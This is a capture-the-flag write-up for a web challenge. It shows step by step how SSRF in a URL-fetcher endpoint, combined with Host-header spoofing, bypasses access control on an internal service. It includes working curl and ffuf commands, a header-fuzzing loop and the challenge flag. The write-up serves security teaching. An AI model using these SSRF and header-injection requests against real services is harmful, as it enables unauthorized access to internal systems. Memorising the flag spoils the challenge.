# 🧩 Who Are You, Really?

## 📌 Challenge Overview
We are given a web service with the hint:

“The server speaks to many… but listens to names more than faces. Sometimes, identity is just a header away.”

This suggests:
- Trust based on headers (names) rather than IP (faces)
- Possible Host header-based authentication bypass

---

## 🔍 Step 1 — Initial Recon
Accessing the root endpoint:

curl http://chall-<target>/

Response:
Welcome to the URL fetcher service!

👉 This indicates a URL fetcher service, commonly vulnerable to SSRF (Server-Side Request Forgery).

---

## 🔍 Step 2 — Endpoint Enumeration
Using ffuf:

ffuf -u http://chall-<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

Discovered:
- /fetch → 405 Method Not Allowed  
- /internal → 403 Forbidden  

👉 Interpretation:
- /fetch = SSRF entry point  
- /internal = protected resource  

---

## 🔍 Step 3 — Confirm SSRF
Testing /fetch:

curl -X POST http://chall-<target>/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost"}'

👉 The server fetches internal URLs → SSRF confirmed.

---

## 🔍 Step 4 — Access Internal Service
Attempt:

curl -X POST http://chall-<target>/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8000/internal"}'

Response:
{"content":"Access Denied","status":403}

👉 Internal service exists but is access-controlled.

---

## 🔍 Step 5 — Interpreting the Hint
“listens to names more than faces”

👉 Meaning:
- Authentication is based on Host header
- Not based on IP address

---

## 🔍 Step 6 — Header Injection via SSRF
/fetch supports custom headers:

{
  "url": "...",
  "headers": {...}
}

👉 This enables:
- Internal requests
- Header manipulation → potential auth bypass

---

## 🔍 Step 7 — Host Header Fuzzing
for h in $(cat host8000.txt); do
  curl -X POST http://chall-<target>/fetch \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.0.0.1:8000/internal\",\"headers\":{\"Host\":\"$h\"}}"
done

👉 Goal: Find a trusted Host value

---

## 🎯 Step 8 — Successful Exploit
Using:

Host: internal.service

Response:
{
"content": "Welcome internal user! Flag: VishaCTF{h057_h34d3r_4u7h_byp455_33957bf6}",
"status": 200
}

---

## 🚩 Final Flag
VishaCTF{h057_h34d3r_4u7h_byp455_33957bf6}

---

## 🧠 Root Cause Analysis
- SSRF vulnerability in /fetch
- Internal service trusts Host header for authentication
- Header injection allows bypass of access control

---

## 🔐 Key Takeaways
- Never trust Host headers for authentication
- SSRF + internal services = critical risk
- Always validate:
  - Outgoing requests
  - User-controlled headers
- Use allowlists and proper internal authentication mechanisms
